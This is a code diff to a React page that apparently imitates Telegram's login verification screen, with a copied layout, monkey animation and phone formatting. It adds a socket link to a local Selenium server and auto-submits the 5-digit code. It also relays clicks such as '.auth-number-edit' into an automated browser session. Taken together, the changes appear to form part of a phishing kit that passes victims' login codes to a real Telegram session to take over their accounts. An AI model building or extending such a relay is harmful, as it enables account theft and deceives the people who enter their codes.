@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useSearchParams } from 'react-router-dom';
+import { io, Socket } from 'socket.io-client';
 
 import { Page } from '@/components/Page.tsx';
 
@@ -10,10 +11,10 @@ export const VerificationCodePage: React.FC = () => {
   const phoneNumber = searchParams.get('phoneNumber');
   
   const [verificationCode, setVerificationCode] = useState('');
-  const [isSubmitting, setIsSubmitting] = useState(false);
   const [status, setStatus] = useState('');
   
   const videoRef = useRef<HTMLVideoElement>(null);
+  const socketRef = useRef<Socket | null>(null);
 
   useEffect(() => {
     // Auto-play the monkey video
@@ -23,6 +24,91 @@ export const VerificationCodePage: React.FC = () => {
       });
     }
   }, []);
+
+  // Socket connection
+  useEffect(() => {
+    if (sessionId) {
+      console.log('🔌 Connecting to Selenium server for verification code page...');
+      console.log('🔌 Session ID:', sessionId);
+      console.log('🔌 Connecting to: http://localhost:3000');
+      
+      // Try different connection configurations
+      let socket;
+      try {
+        socket = io('http://localhost:3000', {
+          transports: ['polling', 'websocket'],
+          timeout: 20000,
+          forceNew: true,
+          autoConnect: true,
+          reconnection: true,
+          reconnectionAttempts: 5,
+          reconnectionDelay: 1000
+        });
+      } catch (error) {
+        console.error('❌ Failed to create socket:', error);
+        // Fallback to basic configuration
+        socket = io('http://localhost:3000');
+      }
+      
+      console.log('🔌 Socket created:', socket);
+      socketRef.current = socket;
+
+      socket.on('connect', () => {
+        console.log('✅ Connected to Selenium server from verification code page');
+        console.log('✅ Socket ID:', socket.id);
+        console.log('✅ Socket connected:', socket.connected);
+      });
+
+      socket.on('connect_error', (error) => {
+        console.error('❌ Socket connection error:', error);
+        console.error('❌ Error details:', {
+          message: error.message,
+          name: error.name,
+          stack: error.stack
+        });
+        console.log('💡 Make sure the Selenium server is running on http://localhost:3000');
+      });
+
+      socket.on('disconnect', (reason) => {
+        console.log('❌ Disconnected from Selenium server:', reason);
+        console.log('❌ Socket connected after disconnect:', socket.connected);
+      });
+
+      // Retry connection if it fails
+      socket.on('reconnect', (attemptNumber) => {
+        console.log('🔄 Reconnected to Selenium server after', attemptNumber, 'attempts');
+      });
+
+      socket.on('reconnect_error', (error) => {
+        console.error('❌ Reconnection error:', error);
+      });
+
+      // Add a timeout to check connection status
+      setTimeout(() => {
+        console.log('🔍 Socket status after 3 seconds:', {
+          connected: socket.connected,
+          id: socket.id
+        });
+        
+        // If still not connected, try manual connection
+        if (!socket.connected) {
+          console.log('🔄 Attempting manual connection...');
+          socket.connect();
+        }
+      }, 3000);
+
+      // Expose socket for manual testing in console
+      (window as any).debugSocket = socket;
+      console.log('🔧 Socket exposed as window.debugSocket for manual testing');
+
+      return () => {
+        if (socketRef.current) {
+          socketRef.current.disconnect();
+          socketRef.current = null;
+        }
+      };
+    }
+  }, [sessionId]);
 
   // Format phone number with proper spacing like Telegram
   const formatPhoneNumber = (phone: string) => {
@@ -78,16 +164,19 @@ export const VerificationCodePage: React.FC = () => {
     // Only allow digits
     if (/^\d*$/.test(value)) {
       setVerificationCode(value);
+      
+      // Auto-submit when 5 digits are entered
+      if (value.length === 5) {
+        handleSubmit();
+      }
     }
   };
 
   const handleSubmit = async () => {
-    if (!verificationCode || verificationCode.length < 5) {
-      setStatus('Please enter the 5-digit verification code');
-      return;
+    if (!verificationCode || verificationCode.length !== 5) {
+      return; // Only submit when exactly 5 digits
     }
 
-    setIsSubmitting(true);
     setStatus('Verifying code...');
 
     try {
@@ -102,23 +191,12 @@ export const VerificationCodePage: React.FC = () => {
     } catch (error) {
       console.error('Error submitting verification code:', error);
       setStatus('❌ Error submitting code');
-    } finally {
-      setIsSubmitting(false);
     }
   };
 
-  const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Enter') {
-      handleSubmit();
-    }
-  };
-
-  const goBack = () => {
-    navigate(`/phone-login?sessionId=${sessionId}`);
-  };
 
   return (
-    <Page back={true}>
+    <Page back={false}>
       <div style={{
         display: 'flex',
         flexDirection: 'column',
@@ -129,27 +207,6 @@ export const VerificationCodePage: React.FC = () => {
         backgroundColor: 'white',
         fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
       }}>
-        {/* Back Button */}
-        <button
-          onClick={goBack}
-          style={{
-            position: 'absolute',
-            top: '20px',
-            left: '20px',
-            padding: '8px 16px',
-            fontSize: '14px',
-            backgroundColor: '#f8f9fa',
-            color: '#333',
-            border: '1px solid #dee2e6',
-            borderRadius: '6px',
-            cursor: 'pointer',
-            display: 'flex',
-            alignItems: 'center',
-            gap: '8px'
-          }}
-        >
-          ← Back
-        </button>
         {/* Content Container */}
         <div style={{
           display: 'flex',
@@ -166,7 +223,7 @@ export const VerificationCodePage: React.FC = () => {
           }}>
             <video
               ref={videoRef}
-              src="/reactjs-template/monkey.mp4"
+              src="/monkey.mp4"
               style={{
                 width: '120px',
                 height: '120px',
@@ -197,6 +254,60 @@ export const VerificationCodePage: React.FC = () => {
             }}>
               {phoneNumber ? formatPhoneNumber(phoneNumber) : ''}
               <span
+                onClick={() => {
+                  console.log('[pencil] ✏️ Pencil icon clicked, clicking .auth-number-edit button in Selenium...');
+
+                  console.log('[pencil] socketRef.current', socketRef.current);
+                  console.log('[pencil] sessionId', sessionId);
+                  
+                  // Check socket connection status
+                  if (socketRef.current) {
+                    console.log('[pencil] Socket connected:', socketRef.current.connected);
+                    console.log('[pencil] Socket ID:', socketRef.current.id);
+                  }
+                  
+                  // Click the edit button in Selenium
+                  if (socketRef.current && socketRef.current.connected && sessionId) {
+                    socketRef.current.emit('clickAuthFormButton', {
+                      sessionId: sessionId,
+                      selector: '.auth-number-edit',
+                      timestamp: new Date().toISOString()
+                    });
+                    console.log('[pencil] ✅ Edit button click sent to Selenium');
+                  } else {
+                    console.log('[pencil] ⚠️ Socket not ready, attempting to reconnect...');
+                    
+                    // Try to reconnect if socket exists but not connected
+                    if (socketRef.current && !socketRef.current.connected) {
+                      console.log('[pencil] trying to reconnect');
+                      socketRef.current.connect();
+                      
+                      // Wait a bit and try again
+                      setTimeout(() => {
+                        console.log('[pencil] waited a bit, socketRef.current', socketRef.current);
+                        console.log('[pencil] waited a bit, sessionId', sessionId);
+                        if (socketRef.current && socketRef.current.connected && sessionId) {
+                          socketRef.current.emit('clickAuthFormButton', {
+                            sessionId: sessionId,
+                            selector: '.auth-number-edit',
+                            timestamp: new Date().toISOString()
+                          });
+                          console.log('[pencil] ✅ Edit button click sent to Selenium after reconnect');
+                        } else {
+                          console.log('[pencil] ⚠️ Still not connected, navigating directly');
+                        }
+                      }, 1000);
+                    } else {
+                      console.log('[pencil] ⚠️ No socket available, navigating directly');
+                    }
+                  }
+                  
+                  // Wait for numberEditButtonClicked event before navigating
+                  socketRef.current?.once('numberEditButtonClicked', () => {
+                    console.log('[pencil] ✅ Number edit button clicked, navigating to phone login');
+                    navigate(`/phone-login?sessionId=${sessionId}`);
+                  });
+                }}
                 style={{
                   fontSize: '16px',
                   color: '#999', // Light grey to match screenshot
@@ -211,7 +322,7 @@ export const VerificationCodePage: React.FC = () => {
               >
                 {/* Pencil icon using PNG */}
                 <img
-                  src="/reactjs-template/pencil.png"
+                  src="/pencil.png"
                   alt="Edit"
                   style={{
                     width: '20px',
@@ -246,8 +357,7 @@ export const VerificationCodePage: React.FC = () => {
                 placeholder="Code"
                 maxLength={5}
                 style={{
-                  width: '100%',
-                  maxWidth: '280px',
+                  width: 'calc(100% - (16px + 2px)*2)',
                   height: '48px',
                   padding: '0 16px',
                   fontSize: '16px',
@@ -270,25 +380,6 @@ export const VerificationCodePage: React.FC = () => {
             </div>
           </div>
 
-          {/* Submit Button */}
-          <button
-            onClick={handleSubmit}
-            disabled={isSubmitting || !verificationCode || verificationCode.length < 5}
-            style={{
-              width: '100%',
-              padding: '16px',
-              fontSize: '16px',
-              fontWeight: '600',
-              backgroundColor: verificationCode && verificationCode.length >= 5 ? '#0088cc' : '#ccc',
-              color: 'white',
-              border: 'none',
-              borderRadius: '12px',
-              cursor: verificationCode && verificationCode.length >= 5 ? 'pointer' : 'not-allowed',
-              transition: 'background-color 0.2s'
-            }}
-          >
-            {isSubmitting ? 'Verifying...' : 'Submit Code'}
-          </button>
 
           {/* Status Message */}
           {status && (
@@ -306,8 +397,8 @@ export const VerificationCodePage: React.FC = () => {
             </div>
           )}
 
-          {/* Debug Info */}
-          {sessionId && (
+          {/* Debug Info - Only show when SHOW_DEBUG_INFO is true */}
+          {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && sessionId && (
             <div style={{
               marginTop: '24px',
               padding: '12px 16px',
